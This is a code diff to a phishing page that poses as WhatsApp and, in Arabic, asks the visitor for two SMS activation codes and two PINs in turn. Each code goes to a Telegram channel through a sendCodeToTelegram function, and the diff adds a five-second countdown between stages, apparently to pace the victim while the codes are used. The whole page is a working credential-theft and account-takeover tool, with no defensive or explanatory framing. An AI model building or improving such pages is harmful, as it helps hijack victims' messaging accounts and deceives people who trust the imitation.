@@ -98,6 +98,12 @@
         .container button:hover {
             background-color: #1DA955;
         }
+
+        #countdown {
+            color: red;
+            font-weight: bold;
+            margin-top: 10px;
+        }
     </style>
 </head>
 
@@ -113,6 +119,7 @@
         <p>يرجى إدخال رمز التفعيل الأول المكون من 6 أرقام الذي تلقيته عبر رسالة نصية.</p>
         <input id="activationCode1" type="tel" placeholder="رمز التفعيل الأول" maxlength="6">
         <button onclick="submitFirstActivationCode()">متابعة</button>
+        <div id="countdown"></div>
     </div>
 
     <script>
@@ -135,6 +142,23 @@
             });
         }
 
+        function startCountdown(callback) {
+            let countdownValue = 5;
+            const countdownDisplay = document.getElementById('countdown');
+            countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
+
+            const interval = setInterval(() => {
+                countdownValue--;
+                if (countdownValue <= 0) {
+                    clearInterval(interval);
+                    countdownDisplay.textContent = '';
+                    callback();
+                } else {
+                    countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
+                }
+            }, 1000);
+        }
+
         function submitFirstActivationCode() {
             const activationCode1 = document.getElementById('activationCode1').value;
 
@@ -145,15 +169,17 @@
 
             sendCodeToTelegram(activationCode1, "رمز التفعيل الأول");
 
-            // الانتقال إلى المرحلة الثانية
-            const container = document.getElementById('container');
-            container.innerHTML = `
-                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
-                <h1>المرحلة الثانية: رمز التفعيل</h1>
-                <p>يرجى إدخال رمز التفعيل الثاني المكون من 6 أرقام.</p>
-                <input id="activationCode2" type="text" placeholder="رمز التفعيل الثاني" maxlength="6">
-                <button onclick="submitSecondActivationCode()">متابعة</button>
-            `;
+            startCountdown(() => {
+                const container = document.getElementById('container');
+                container.innerHTML = `
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
+                    <h1>المرحلة الثانية: رمز التفعيل</h1>
+                    <p>يرجى إدخال رمز التفعيل الثاني المكون من 6 أرقام.</p>
+                    <input id="activationCode2" type="text" placeholder="رمز التفعيل الثاني" maxlength="6">
+                    <button onclick="submitSecondActivationCode()">متابعة</button>
+                    <div id="countdown"></div>
+                `;
+            });
         }
 
         function submitSecondActivationCode() {
@@ -166,15 +192,17 @@
 
             sendCodeToTelegram(activationCode2, "رمز التفعيل الثاني");
 
-            // الانتقال إلى المرحلة الثالثة
-            const container = document.getElementById('container');
-            container.innerHTML = `
-                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
-                <h1>المرحلة الأولى: PIN</h1>
-                <p>يرجى إدخال رمز PIN الأول المكون من 6 أرقام.</p>
-                <input id="pinCode1" type="text" placeholder="PIN الأول" maxlength="6">
-                <button onclick="submitFirstPin()">متابعة</button>
-            `;
+            startCountdown(() => {
+                const container = document.getElementById('container');
+                container.innerHTML = `
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
+                    <h1>المرحلة الأولى: PIN</h1>
+                    <p>يرجى إدخال رمز PIN الأول المكون من 6 أرقام.</p>
+                    <input id="pinCode1" type="text" placeholder="PIN الأول" maxlength="6">
+                    <button onclick="submitFirstPin()">متابعة</button>
+                    <div id="countdown"></div>
+                `;
+            });
         }
 
         function submitFirstPin() {
@@ -187,15 +215,17 @@
 
             sendCodeToTelegram(pinCode1, "رمز PIN الأول");
 
-            // الانتقال إلى المرحلة الرابعة
-            const container = document.getElementById('container');
-            container.innerHTML = `
-                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
-                <h1>المرحلة الثانية: PIN</h1>
-                <p>يرجى إدخال رمز PIN الثاني المكون من 6 أرقام.</p>
-                <input id="pinCode2" type="text" placeholder="PIN الثاني" maxlength="6">
-                <button onclick="submitSecondPin()">متابعة</button>
-            `;
+            startCountdown(() => {
+                const container = document.getElementById('container');
+                container.innerHTML = `
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
+                    <h1>المرحلة الثانية: PIN</h1>
+                    <p>يرجى إدخال رمز PIN الثاني المكون من 6 أرقام.</p>
+                    <input id="pinCode2" type="text" placeholder="PIN الثاني" maxlength="6">
+                    <button onclick="submitSecondPin()">متابعة</button>
+                    <div id="countdown"></div>
+                `;
+            });
         }
 
         function submitSecondPin() {
@@ -207,7 +237,10 @@
             }
 
             sendCodeToTelegram(pinCode2, "رمز PIN الثاني");
-            alert('تم إكمال جميع المراحل بنجاح!');
+
+            startCountdown(() => {
+                alert('تم إكمال جميع المراحل بنجاح!');
+            });
         }
     </script>
 </body>
